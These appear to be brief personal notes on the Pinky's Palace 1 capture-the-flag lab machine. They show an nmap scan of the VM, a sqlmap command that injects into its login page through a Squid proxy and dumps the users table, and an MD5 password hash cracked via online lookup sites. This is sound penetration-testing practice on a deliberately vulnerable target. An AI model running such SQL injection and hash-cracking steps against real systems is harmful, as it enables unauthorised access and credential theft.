https://hackso.me/pinkys-palace-1-walkthrough/	

└─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.22                                            130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-24 14:44 CEST
Nmap scan report for 192.168.110.22
Host is up (0.00096s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE    VERSION
8080/tcp  open  http       nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: 403 Forbidden
31337/tcp open  http-proxy Squid http proxy 3.5.23
|_http-server-header: squid/3.5.23
|_http-title: ERROR: The requested URL could not be retrieved
64666/tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 df:02:12:4f:4c:6d:50:27:6a:84:e9:0e:5b:65:bf:a0 (RSA)
|   256 0a:ad:aa:c7:16:f7:15:07:f0:a8:50:23:17:f3:1c:2e (ECDSA)
|_  256 4a:2d:e5:d8:ee:69:61:55:bb:db:af:29:4e:54:52:2f (ED25519)
MAC Address: 08:00:27:18:54:5E (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.95 ms 192.168.110.22




└─$ sqlmap --url http://pinkys-palace:8080/littlesecrets-main/login.php --data="user=admin&pass=admin" --proxy=http://192.168.110.22:31337 --batch --level=3 -D pinky_sec_db -T users --dump

+-----+----------------------------------+-------------+
| uid | pass                             | user        |
+-----+----------------------------------+-------------+
| 1   | f543dbfeaf238729831a321c7a68bee4 | pinky       |
| 2   | d60dffed7cc0d87e1f4a11aa06ca73af | pinkymanage | 3pinkysaf33pinkysaf3
+-----+----------------------------------+-------------+

https://md5hashing.net
d60dffed7cc0d87e1f4a11aa06ca73af ==> 3pinkysaf33pinkysaf3
https://hashtoolkit.com